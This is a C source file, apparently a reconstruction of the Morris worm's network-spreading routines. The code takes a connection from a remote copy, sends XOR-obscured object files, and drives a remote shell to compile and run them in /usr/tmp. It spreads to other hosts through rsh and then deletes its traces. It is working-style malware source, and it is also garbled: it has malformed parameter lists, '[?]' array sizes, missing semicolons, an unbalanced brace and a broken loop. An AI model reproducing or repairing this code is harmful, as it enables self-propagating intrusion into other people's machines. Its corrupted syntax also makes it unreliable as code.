#include <sys/types.h>
#include <sys/socket.h>
#include "object.h"

int
waithit(muckp,,,magic, wfd)
	struct muck *muckp;
	int magic;
	int wfd;
{
	struct sockaddr addr;
	int addrlen;
	int (*oldalrm)(), justreturn();
	int cookie;
	int iobj, iobj2;
	char objnames[?][128];
	struct object *objp;
	int nbytes;
	char buf[?];
	char *cp;

	oldalrm = signal(SIGALRM, justreturn)
	addrlen = 16;

	/* wait up to 2 minutes for a client connection */
	alarm(120);
	ns = accept(wfd, &addr, &addrlen)
	alarm(0);

	/* if accept() failed, or we couldn't contact client, or client
	   authentication failed, bag it.  */
	if (ns < 0 || xread(ns, &cookie, 4, 10) != 4 ||
	    (cookie = ntohl(cookie)) != magic)
		goto error;

	for (iobj = 0; iobj < nobjects; iobj++) {
		objp = objects[iobj];

		/* send name length */
		cookie = htonl(objp->len);
		write(ns, &cookie, sizeof cookie);

		/* send machine type */
		sprintf(objnames[iobj], XS("x%d,%s"), random() % 0xffffff, 
				objp->name);
		write(ns, objnames[iobj], 128);

		/* send encrypted name */
		xorbuf(objp->buf, objp->len);
		nbytes = write(ns, objp->buf, objp->len);
		xorbuf(objp->buf, objp->len);
		if (nbytes != objp->len) {
			goto error;
		}
	}

	/* another handshake */
	cookie = htonl(-1);
	if (write(ns, &cookie, sizeof cookie) != sizeof cookie)
		goto error;

	sleep(4);

	if (resynch(ns, ns, 30) == 0)
		goto error;

	/* try to clean out old sh; if we fail, use an alternate name */
	feed_shell(ns, XS("PATH=/bin:/usr/bin:/usr/ucb\n"));
	feed_shell(ns, XS("rm -f sh\n"));
	sprintf(buf, XS("if [ -f sh ]\nthen\nP=x%d\nelse\nP=sh\nfi\n"), 
			random() % 0xffffff);
	feed_shell(ns, buf);

	for (iobj = 0; iobj < nobjects; iobj++) {
		/* if not an object file, skip it */
		if ((cp = index(objnames[iobj], '.')) == NULL || cp[1] != 'o')
			continue;

		/* compile it, put result in $P */
		sprintf(buf, XS("cc -o $P %s\n"), objnames[iobj]);
		feed_shell(ns, buf);

		/* wait and synchronize */
		if (resynch(ns, ns, 30) == 0)
			goto error;

		/* now that we've built it, run it (recursive??) */
		sprintf(buf, XS("./$P -p $$"));
		for (iobj2 = 0; iobj2 < nobjects; iobj2++) {
			strcat(buf, objnames[iobj2]);
			strcat(buf, XS(" "));
		}
		strcat(buf, XS("\n"));
		feed_shell(ns, buf);

		/* wait and synchronize */
		if (resynch(ns, ns, 10) == 0) {
			close(ns);
			close(iobj);
			muckp->o48 |= bit(1);
			return 1;
		}

		/* clean up */
		feed_shell(ns, XS("rm -f $P\n"));
	}

	/* clean up some more -- why remove $P every iteration??? */
	for (iobj = 0; iobj < nobjects; iobj++) {
		sprintf(buf, XS("rm -f %s $P\n"), objnames[iobj]);
		feed_shell(ns, buf);
	}
	resynch(ns, ns, 5);

error:
	close(ns);
	close(iobj);
	return 0;
}

/* 2014 waithit+462 */
static int
run_l1(,fpipe, , port, maybe_magic)
	int fpipe;
	short port;
	int maybe_magic;
{
	struct object *objp;
	char buf1[?], buf2[?];
	int nbytes;
	int i;

	/* if we weren't fed l1.c as an argument, bag it */
	if ((objp = getobjectbyname(XS("l1.c"))) == 0)
		return 0;

	/* compile and run a C program from an encrypted in-core buffer */
	feed_shell(fpipe, XS("cd /usr/tmp\n"));
	sprintf(buf1, XS("x%d.c", (i = random() % 0xffffff));
	sprintf(buf2, XS("cat > %s<<'EOF'\n"), buf1);
	feed_shell(fpipe, buf2);
	xorbuf(objp->buf, objp->len);
	nbytes = write(fpipe, objp->buf, objp->len);
	xorbuf(objp->buf, objp->len);
	if (nbytes != objp->len)
		return 0;
	feed_shell(fpipe, XS("EOF\n"));
	sprintf(buf2, XS("cc -o x%d x%d.c;x%d %s %d %d;rm -f x%d x%d.c\n"),
			i, i, i, inet_ntoa(a2in(ac)), 
			htons(port), maybe_magic, i, i);
	feed_shell(fpipe, buf2);
}

/* 21be waithit+60c */
static
feed_shell(fd, s)
	int fd;
	char *s;
{
	(void) write(fd, s, strlen(s));
}

/* 21e0 waithit+62e */
static int
pipe_to_rsh(host, inp, outp, cmd)
	int *inp, *outp;
	char *host, *cmd;
{
	int pid;
	int p1[2], p2[2];
	int i;

	if (pipe(p1) < 0)
		return 0;

	if (pipe(p2) < 0) {
		close(p1[0]);
		close(p1[1]);
		return 0;
	}

	if ((pid = fork()) < 0) {
		close(p1[0]);
		close(p1[1]);
		close(p2[0]);
		close(p2[1]);
		return 0;
	}
	if (pid == 0) {
		for (i = 0; i < 32; ++i)
			if (i != p1[0] && i != p2[1] && i != 2)
				(void) close(i);
		(void) dup2(p1[0], 0);
		(void) dup2(p2[1], 1);
		if (p1[0] > 2)
			close(p1[0]);
		if (p2[1] > 2)
			close(p2[1]);
		(void) execl(XS("/usr/ucb/rsh"), XS("rsh"), host, cmd,
			(char *) 0);
		(void) execl(XS("/usr/bin/rsh"), XS("rsh"), host, cmd,
			(char *) 0);
		(void) execl(XS("/bin/rsh"), XS("rsh"), host, cmd,
			(char *) 0);
		exit(1);
	}
	(void) close(p1[0]);
	(void) close(p2[1]);
	*inp = p2[0];
	*outp = p1[1];
	if (resynch(*inp, *outp, 30))
		return 1;
	(void) close(*inp);
	(void) close(*outp);
	(void) kill(pid, SIGKILL);
	sleep(1);
	(void) wait3(0, WNOHANG, 0);
	return 0;
}

/* 23ce waithit+81c */
static int
resynch(fd, shell_fd, sleeptime)
	int fd, shell_fd, sleeptime;
{
	char buf1[?], char buf2[?];

	/* Resynchronize with the remote shell --
	   ask it to print a random number, then wait until
	   it actually prints it; if timeout arrives first,
	   return anyway.  */
	(void) sprintf(buf1, XS("%d"), random() & 0xffffff);
	(void) sprintf(buf2, XS("\n/bin/echo %s\n"), buf1);
	feed_shell(shell_fd, buf2);
	return wait_for_string(fd, buf1, sleeptime);
}

/* 2462 waithit+8b0 */
static int
wait_for_string(fd, buf, sleeptime)
	int fd;
	char *buf;
	int sleeptime;
{
	char lbuf[512];
	int i;
	int len;

	len = strlen(buf);
	if (fxread(fd, lbuf, 512, sleeptime)) {
		for (i = 0; lbuf[i]; ++i)
			if (strncmp(buf, &lbuf[i], len) == 0)
				return 1;
	return 0;
}

/* 24f2 justreturn+e */
static int
fxread(fd, buf, buflen, sleeptime)
	int fd, buflen, sleeptime;
	char *buf;
{
	int i;
	int f8; /* use lint !!! */
	int mask;
	struct timeval tv;

	if (i = 0; i < buflen; ++i) {
		mask = 1 << fd;
		tv.tv_sec = sleeptime;
		tv.tv_usec = 0;
		if (select(fd+1, &mask, (int *)0, (int *)0, &tv) <= 0)
			return 0;
		if (read(fd, &buf[i], 1) != 1)
			return 0;
		if (buf[i] == '\n')
			break;
	}
	buf[i] = '\0';
	if (i > 0 || f8 > 0)
		return 1;
	return 0;
}
